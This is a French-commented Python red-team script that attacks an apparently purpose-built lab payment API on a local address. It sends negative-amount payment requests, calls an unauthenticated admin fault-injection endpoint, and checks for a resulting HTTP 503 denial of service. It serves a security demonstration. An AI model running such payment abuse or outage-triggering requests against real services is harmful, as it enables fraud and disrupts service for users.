# Fichier : redteam/attack.py
import requests
import time
import sys

# Remplacer par l'IP du PC Hôte sur le point d'accès (192.168.137.1 par défaut)
TARGET_HOST = "192.168.137.1"
API_URL = f"http://{TARGET_HOST}:8000"

def run_attack():
    print(f"[*] Démarrage de l'offensive Red Team sur {API_URL}...")
    
    # 1. Envoi de salves de requêtes malveillantes / volumétriques
    print("[*] Injection de charge applicative anormale...")
    for i in range(10):
        try:
            requests.post(
                f"{API_URL}/api/v1/pay",
                json={"user_id": f"ATTACKER_{i}", "amount": -100.0, "destination_account": "EXPLOIT"},
                timeout=1
            )
        except Exception:
            pass

    # 2. Exploitation / Déclenchement de la rupture de service
    print("[!] Déclenchement de la défaillance critique du composant de paiement...")
    try:
        r = requests.post(f"{API_URL}/admin/inject-fault", timeout=3)
        if r.status_code == 200:
            print("[+] Charge utile livrée : composant de paiement corrompu.")
        else:
            print(f"[-] Code de réponse inattendu : {r.status_code}")
    except Exception as e:
        print(f"[-] Erreur de connexion vers la cible : {e}")

    # 3. Vérification de l'indisponibilité constatée par l'attaquant
    time.sleep(1)
    try:
        check = requests.post(
            f"{API_URL}/api/v1/pay",
            json={"user_id": "TEST", "amount": 10.0, "destination_account": "CHECK"},
            timeout=3
        )
        if check.status_code == 503:
            print("[+] Succès de l'attaque : Déni de service confirmé (HTTP 503).")
    except Exception:
        print("[+] Succès de l'attaque : Service injoignable.")

if __name__ == "__main__":
    run_attack()